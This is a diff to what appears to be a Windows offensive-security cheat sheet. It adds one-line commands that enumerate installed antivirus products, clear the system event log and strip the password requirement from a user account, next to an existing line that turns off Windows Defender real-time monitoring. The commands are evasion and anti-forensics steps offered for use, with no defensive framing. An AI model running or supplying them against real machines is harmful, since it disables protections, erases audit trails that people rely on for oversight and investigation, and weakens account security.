@@ -257,5 +257,12 @@
 * Disable Windows defender
 -> Set-MpPreference -DisableRealtimeMonitoring $true
 
+* Get antivirus details
+-> wmic /namespace:\\root\securitycenter2 path antivirusproduct GET displayName, productState, pathToSignedProductExe
 
+* Clear system event logs
+-> wmic nteventlog where filename='system' call cleareventlog
+
+* Remove Password requirement for logging
+-> wmic useraccount where name='demo' set PasswordRequired=false
 
